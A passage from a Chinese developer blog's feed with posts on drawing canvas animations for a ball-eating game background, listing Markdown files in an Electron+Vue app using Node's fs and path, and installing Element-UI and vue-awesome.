class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span>算出当前角度a在圆周上的点的坐标，但是如何将“变化”应用到坐标上。这里直接想象不太好想象，我们可以理解成半径随着<code>sin</code>的变化而变化，于是，新的半径为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>r</mi><mi>a</mi></msub><mo>=</mo><mi>r</mi><mo>+</mo><mi>b</mi><mo separator="true">⋅</mo><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">r_a=r+b·sin(a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span>，其中b为一个调整系数常量，绘制坐标公式也为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><mo stretchy="false">(</mo><mi>r</mi><mo>+</mo><mi>b</mi><mo separator="true">⋅</mo><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo separator="true">⋅</mo><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo><mi mathvariant="normal">和</mi><mi>y</mi><mo>=</mo><mo stretchy="false">(</mo><mi>r</mi><mo>+</mo><mi>b</mi><mo separator="true">⋅</mo><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo separator="true">⋅</mo><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x=(r+b·sin(a))·cos(a)和y=(r+b·sin(a))·sin(a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mclose">)</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mord cjk_fallback">和</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mclose">)</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span>。</p><img src="/2017/08/03/ball-battle-on-my-blog-background/6.png" class="" title="路径点计算"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 绘制刺球</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>._prick.list.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> prick = <span class="built_in">this</span>._prick.list[i];</span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.arc(prick.x, prick.y, prick.radius, <span class="number">0</span>, <span class="built_in">Math</span>.PI * <span class="number">2</span>);</span><br><span class="line">    ctx.closePath();</span><br><span class="line">    ctx.fillStyle = <span class="string">&quot;#fff&quot;</span>;</span><br><span class="line">    ctx.fill();</span><br><span class="line"></span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.strokeStyle = <span class="string">&quot;rgba(255, 0, 0, 0.4)&quot;</span>;</span><br><span class="line">    ctx.lineWidth = <span class="number">2</span>;</span><br><span class="line">    ctx.moveTo(prick.x + prick.radius * <span class="built_in">Math</span>.cos(<span class="number">0</span>), prick.y + prick.radius * <span class="built_in">Math</span>.sin(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="number">0</span>; a &lt; <span class="number">360</span>; a++) &#123;</span><br><span class="line">        ctx.lineTo(prick.x + (prick.radius + <span class="number">2</span> * <span class="built_in">Math</span>.sin(a * <span class="number">2</span>)) * <span class="built_in">Math</span>.cos(<span class="built_in">Math</span>.PI / <span class="number">180.0</span> * a),</span><br><span class="line">            prick.y + (prick.radius + <span class="number">2</span> * <span class="built_in">Math</span>.sin(a * <span class="number">2</span>)) * <span class="built_in">Math</span>.sin(<span class="built_in">Math</span>.PI / <span class="number">180.0</span> * a))</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.stroke();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="绘制网格背景"><a class="markdownIt-Anchor" href="#绘制网格背景"></a> 绘制网格背景</h1><p>这个没啥好说的，就是划线，一定间隔划线。话说，如果间隔足够小，那么画的线就变成了面，这就是“线动成面”的原理。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 背景网格</span></span><br><span class="line">ctx.lineWidth = <span class="number">1</span>;</span><br><span class="line">ctx.strokeStyle = <span class="string">&quot;#eee&quot;</span>;</span><br><span class="line">ctx.beginPath();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt;= <span class="built_in">this</span>.width; i += <span class="number">20</span>) &#123;</span><br><span class="line">    ctx.moveTo(i, <span class="number">0</span>);</span><br><span class="line">    ctx.lineTo(i, <span class="built_in">this</span>.height);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt;= <span class="built_in">this</span>.height; i += <span class="number">20</span>) &#123;</span><br><span class="line">    ctx.moveTo(<span class="number">0</span>, i);</span><br><span class="line">    ctx.lineTo(<span class="built_in">this</span>.width, i);</span><br><span class="line">&#125;</span><br><span class="line">ctx.stroke();</span><br></pre></td></tr></table></figure><h1 id="其它"><a class="markdownIt-Anchor" href="#其它"></a> 其它</h1><p>除了上面说到的那些，还有其它一些细节。比如，给球球设置了一个保护期，主要避免球球碰到刺球分裂的时候，又被自己吃掉了。<img class="emoji" draggable="false" alt="🐶" src="https://twemoji.maxcdn.com/2/72x72/1f436.png"/>这里定义200帧以内为保护期，保护期内会禁止碰撞检测，只进行位置更新。比如，刺球对比它小的球球没有效果，可以说是弱者的保护伞呐<img class="emoji" draggable="false" alt="☔" src="https://twemoji.maxcdn.com/2/72x72/2614.png"/>️。还比如，保护期内还给球球画了一个贴心的保护罩罩，用的画弧线实现的。哎，字写起来太累，这里就不叙述了。</p><p>希望看官们喜欢这次的背景，下次更新还不知道要到啥时候，有空可以移步“秀一秀”看看过去的那些背景。其实最近已经构想了5-6个背景，不过太懒了再加上心情很容易不好，有空的时候会一一实现的，感觉还是蛮有意思的。那么最快下月再见了。</p><p>祝你的八月天天快乐。<img class="emoji" draggable="false" alt="👊" src="https://twemoji.maxcdn.com/2/72x72/1f44a.png"/></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;很早以前有个游戏叫 &lt;code&gt;agar&lt;/code&gt; ，就是类似大球吃小球的游戏。最近国内在手游上也出现了类似的游戏，比较好的有《球球大作战》和《疯狂贪吃蛇》。对于这两款游戏，不是很感冒，不过还是想把其中的一些内容提取出来，做成一个博客背景动画。&lt;/p&gt;
&lt;p&gt;从想法到实</summary>
      
    
    
    
    <category term="果然还是前端" scheme="https://sumygg.com/categories/%E6%9E%9C%E7%84%B6%E8%BF%98%E6%98%AF%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="canvas" scheme="https://sumygg.com/tags/canvas/"/>
    
    <category term="animation" scheme="https://sumygg.com/tags/animation/"/>
    
    <category term="球球大作战" scheme="https://sumygg.com/tags/%E7%90%83%E7%90%83%E5%A4%A7%E4%BD%9C%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>从零开始捣鼓一个Electron应用——文件读取</title>
    <link href="https://sumygg.com/2017/06/20/start-from-the-very-beginning-for-electron-with-reading-file-state/"/>
    <id>https://sumygg.com/2017/06/20/start-from-the-very-beginning-for-electron-with-reading-file-state/</id>
    <published>2017-06-20T15:08:09.000Z</published>
    <updated>2021-03-16T08:51:03.006Z</updated>
    
    <content type="html"><![CDATA[<p>今天要实现的一个内容是，选择一个目录，读取目录中的文件，然后把扩展名为 <code>.md</code> 文件的文件名和文件大小列举出来，最后展示在表格中。</p><h1 id="本篇技术栈和主要技能"><a class="markdownIt-Anchor" href="#本篇技术栈和主要技能"></a> 本篇技术栈和主要技能</h1><ul><li>Vue组件的编写（主要是template，不涉及多个组件传递）</li><li>通过electron调用系统原生组件（打开文件对话框）</li><li>fs和path操作文件（获取文件信息）</li></ul><h1 id="直接贴代码吧"><a class="markdownIt-Anchor" href="#直接贴代码吧"></a> 直接贴代码吧</h1><p>下面代码是单个页面的代码，要使用还要在路由文件 <code>route/index.js</code> 中加入路由信息，并在导航栏上添加入口。其它的地方不需要过多的修改。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;selecter&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">placeholder</span>=<span class="string">&quot;请选择目录&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;dictorySelected&quot;</span> <span class="attr">:disabled</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> <span class="attr">slot</span>=<span class="string">&quot;prepend&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showFileDialog()&quot;</span>&gt;</span>选择目录<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;datatable&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>共有 &#123;&#123;tableData.length&#125;&#125; 条记录<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-table</span> <span class="attr">v-loading</span>=<span class="string">&quot;isLoading&quot;</span> <span class="attr">element-loading-text</span>=<span class="string">&quot;拼命加载中&quot;</span> <span class="attr">:data</span>=<span class="string">&quot;tableData&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100%&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;filename&quot;</span> <span class="attr">label</span>=<span class="string">&quot;文件名&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;filesize&quot;</span> <span class="attr">label</span>=<span class="string">&quot;文件大小&quot;</span> <span class="attr">fixed</span>=<span class="string">&quot;right&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  name: <span class="string">&#x27;file-listing-page&#x27;</span>,</span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">      dictorySelected: <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">      isLoading: <span class="literal">false</span>,</span></span><br><span class="line">      tableData: []</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">showFileDialog</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> dialog = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>).remote.dialog</span></span><br><span class="line"><span class="javascript">      dialog.showOpenDialog(&#123; <span class="attr">properties</span>: [<span class="string">&#x27;openDirectory&#x27;</span>] &#125;, <span class="function">(<span class="params">filename</span>) =&gt;</span> &#123;</span></span><br><span class="line">        if (filename.length === 1) &#123;</span><br><span class="line"><span class="javascript">          <span class="built_in">this</span>.dictorySelected = filename[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript">          <span class="built_in">this</span>.listingFile(<span class="built_in">this</span>.dictorySelected)</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">listingFile</span>(<span class="params">filepath</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.isLoading = <span class="literal">true</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span></span><br><span class="line"><span class="javascript">      fs.readdir(filepath, <span class="function">(<span class="params">err, file</span>) =&gt;</span> &#123;</span></span><br><span class="line">        if (err) &#123;</span><br><span class="line"><span class="javascript">          <span class="built_in">this</span>.isLoading = <span class="literal">false</span></span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> alert(err)</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.tableData = []</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> filename <span class="keyword">of</span> file) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">const</span> stat = fs.statSync(path.join(filepath, filename))</span></span><br><span class="line">          if (stat.isFile()) &#123;</span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (path.extname(filename).toLowerCase() === <span class="string">&#x27;.md&#x27;</span>) &#123;</span></span><br><span class="line"><span class="javascript">              <span class="built_in">this</span>.tableData.push(&#123;</span></span><br><span class="line">                filename: filename,</span><br><span class="line">                filesize: stat.size</span><br><span class="line">              &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.isLoading = <span class="literal">false</span></span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line">.container &#123;</span><br><span class="line"><span class="css">  <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.datatable &#123;</span><br><span class="line"><span class="css">  <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="果然还是要稍微说明一下"><a class="markdownIt-Anchor" href="#果然还是要稍微说明一下"></a> 果然还是要稍微说明一下</h1><h2 id="打开文件对话框"><a class="markdownIt-Anchor" href="#打开文件对话框"></a> 打开文件对话框</h2><p>通过electron可以调用原生的系统组件，这里需要展示打开文件对话框。<code>require('electron').remote.dialog</code> 可以引用electron中操作dialog的部分，然后通过<code>dialog.showOpenDialog()</code>函数显示打开文件对话框。在回调函数中可以获取到选择的内容。</p><p>另外注意的是，electron分为<strong>主进程</strong>和<strong>渲染进程</strong>，我们的这些代码是需要执行在渲染进程中的，因此，需要通过<code>remote</code>接口获取主进程的<code>dialog</code>对象。</p><h2 id="fs列举文件夹内容"><a class="markdownIt-Anchor" href="#fs列举文件夹内容"></a> fs列举文件夹内容</h2><p>node提供的fs包可以操作文件和文件夹，<code>fs.readdir(filepath, function(err, file)&#123;&#125;)</code>给出一个目录filepath，可以在回调函数中获取到文件信息。</p><p><code>fs.statSync()</code> 可以获取文件的状态信息，这是一个同步方法，有返回值。通过返回的stat对象就可以判断当前文件是不是个文件<code>isFile()</code>，当然如果不是文件就直接忽略过去。stat中的具体内容可以打个log查看一下。</p><p><strong>异步方法</strong>需要在回调函数里获取函数返回的内容，<strong>同步方法</strong>直接从函数返回值获取。</p><h2 id="path文件名路径操作"><a class="markdownIt-Anchor" href="#path文件名路径操作"></a> path文件名路径操作</h2><p><code>path.extname()</code> 获取文件的扩展名，包含点号。</p><p><code>path.join()</code> 可以将两个目录连接起来，连接的方式可以参考命令CD的方式。</p><h2 id="style-scoped"><a class="markdownIt-Anchor" href="#style-scoped"></a> style scoped</h2><p><code>&lt;style scoped&gt;</code> 表示当前style只作用于当前template，具体实现方式是编译的时候添加标识符，通过class和标识符双重选中，以限定范围。</p><h1 id="总结一下"><a class="markdownIt-Anchor" href="#总结一下"></a> 总结一下</h1><p>本篇的内容不算太多，主要时间花费在了调试之前界面一个fixed背景不充满的问题上。另外，对函数的不熟悉也会举步维艰。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天要实现的一个内容是，选择一个目录，读取目录中的文件，然后把扩展名为 &lt;code&gt;.md&lt;/code&gt; 文件的文件名和文件大小列举出来，最后展示在表格中。&lt;/p&gt;
&lt;h1 id=&quot;本篇技术栈和主要技能&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=</summary>
      
    
    
    
    <category term="体验Electron" scheme="https://sumygg.com/categories/%E4%BD%93%E9%AA%8CElectron/"/>
    
    
    <category term="electron" scheme="https://sumygg.com/tags/electron/"/>
    
    <category term="vue" scheme="https://sumygg.com/tags/vue/"/>
    
    <category term="fs" scheme="https://sumygg.com/tags/fs/"/>
    
    <category term="path" scheme="https://sumygg.com/tags/path/"/>
    
  </entry>
  
  <entry>
    <title>从零开始捣鼓一个Electron应用——界面组件</title>
    <link href="https://sumygg.com/2017/06/19/start-from-the-very-beginning-for-electron-with-element-ui-and-icon/"/>
    <id>https://sumygg.com/2017/06/19/start-from-the-very-beginning-for-electron-with-element-ui-and-icon/</id>
    <published>2017-06-19T13:04:10.000Z</published>
    <updated>2021-03-16T08:51:03.005Z</updated>
    
    <content type="html"><![CDATA[<p>上一篇捣鼓了一个Electron-vue的脚手架，把Vue的全家桶搭建了一下，也很给面子的跑了起来。接下来就是如何一步一步完成我心中的那个“她”了。</p><p>首先先巴拉巴拉自己的技能：</p><ol><li>Vue用过，了解Vue的MVVM思想，但是Vue2及其全家桶确实第一次用</li><li>能写原生JavaScript程序，但是不明白什么是ES5或是ES6，反正就是看心情写了</li><li>React了解一点，但是没有写过，所以Vue2中类似于React的思想也是。。。<img class="emoji" draggable="false" alt="😂" src="https://twemoji.maxcdn.com/2/72x72/1f602.png"/></li><li>总之，不要放弃治疗，从0开始异世界之旅吧。。。</li></ol><p>每一篇文章都把自己的思（x）考（度）过程尽量表述出来，在文章开始的时候也会将本篇用到的东西稍微列举一下的。</p><h1 id="本篇技术栈和主要技能"><a class="markdownIt-Anchor" href="#本篇技术栈和主要技能"></a> 本篇技术栈和主要技能</h1><p>本篇先把以下内容整合到一起，然后做一个简单的欢迎页面，之后需要什么再继续补充。</p><ul><li><img class="emoji" draggable="false" alt="📤" src="https://twemoji.maxcdn.com/2/72x72/1f4e4.png"/>Vue全家桶：vue2 + vuex + vue-router + webpack</li><li><img class="emoji" draggable="false" alt="🐇" src="https://twemoji.maxcdn.com/2/72x72/1f407.png"/>网络请求：axios（脚手架里自带，感觉上不会用到网络请求的）</li><li><img class="emoji" draggable="false" alt="🎈" src="https://twemoji.maxcdn.com/2/72x72/1f388.png"/>页面UI：Element-UI（本篇重点就是把它招募进来）、vue-awesome（这不是文章汇总）</li></ul><h1 id="组件安装"><a class="markdownIt-Anchor" href="#组件安装"></a> 组件安装</h1><h2 id="引用element-ui"><a class="markdownIt-Anchor" href="#引用element-ui"></a> 引用Element-UI</h2><p>Element-UI的安装文档可以参考<a href="http://element.eleme.io/#/zh-CN/component/installation">这里</a></p><p>通过npm安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install element-ui -S</span><br></pre></td></tr></table></figure><p>然后想要完整引入Element，在main.js加入以下几行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ElementUI <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;element-ui/lib/theme-default/index.css&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(ElementUI)</span><br></pre></td></tr></table></figure><p>随便测试一下应该就能用了。</p><h2 id="引入vue-awesome"><a class="markdownIt-Anchor" href="#引入vue-awesome"></a> 引入vue-awesome</h2><p><a href="https://github.com/justineo/vue-awesome">vue-awesom</a> 是对 <a href="http://fontawesome.io/">Font Awesome</a> 的一个封装，首先还是通过npm安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vue-awesome</span><br></pre></td></tr></table></figure><p>然后还是在main.js内全局引入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;vue-awesome/icons&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Icon <span class="keyword">from</span> <span class="string">&#x27;vue-awesome/components/Icon&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.component(<span class="string">&#x27;icon&#x27;</span>, Icon)</span><br></pre></td></tr></table></figure><p>测试一下肯定也能用。</p><h1 id="创建布局"><a class="markdownIt-Anchor" href="#创建布局"></a> 创建布局</h1><p>下面开始实现一些功能，首先想在左面加入一个导航栏，用来选取功能，右面显示具体的功能，整个页面大概是这个样子的。</p><img src="/2017/06/19/start-from-the-very-beginning-for-electron-with-element-ui-and-icon/1.png" class="" title="页面布局"><p>左边导航栏固定宽度，右边浮动。布局页面 <code>PageFrame.vue</code> 定义导航栏和显示内容的位置</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 